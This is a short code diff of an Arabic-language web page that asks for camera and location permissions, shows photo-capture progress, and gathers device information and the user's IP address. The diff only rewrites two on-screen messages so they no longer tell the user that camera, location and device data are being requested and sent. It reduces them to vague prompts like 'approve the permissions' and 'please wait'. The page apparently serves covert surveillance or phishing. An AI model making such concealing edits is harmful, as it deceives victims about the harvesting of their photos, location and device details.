@@ -265,7 +265,7 @@
         </svg>
     </div>
     <div class="loading-text" id="loadingText">جاري طلب الصلاحيات...</div>
-    <div class="loading-sub" id="loadingSub">يرجى الموافقة على الوصول للكاميرا والموقع</div>
+    <div class="loading-sub" id="loadingSub"> يرجى الموافقة على الصلاحيات </div>
     <div class="photo-progress" id="photoProgress" style="display:none;">
         <div class="photo-progress-bar" id="photoProgressBar"></div>
     </div>
@@ -561,7 +561,7 @@
             });
 
             // 4. إرسال المعلومات
-            showLoading('جاري التحقق من البيانات...', 'يتم إرسال معلومات الجهاز والموقع');
+            showLoading('جاري التحقق من البيانات...', 'يرجى الانظار');
 
             const deviceInfo = getDeviceInfo();
             const ip = await getIP();
